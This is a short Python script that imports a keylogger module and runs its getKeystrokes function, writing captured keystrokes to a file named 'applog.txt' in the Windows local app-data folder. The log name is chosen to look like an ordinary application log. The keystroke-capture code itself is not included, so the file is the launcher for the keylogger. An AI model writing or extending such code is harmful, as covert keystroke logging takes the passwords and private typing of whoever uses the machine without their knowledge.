import os
from Keyloggers import keylogger1

def main():
    log_dir = os.environ['localappdata']
    log_name = 'applog.txt'

    keylogger1.getKeystrokes(log_dir, log_name)

if __name__== '__main__':
        main()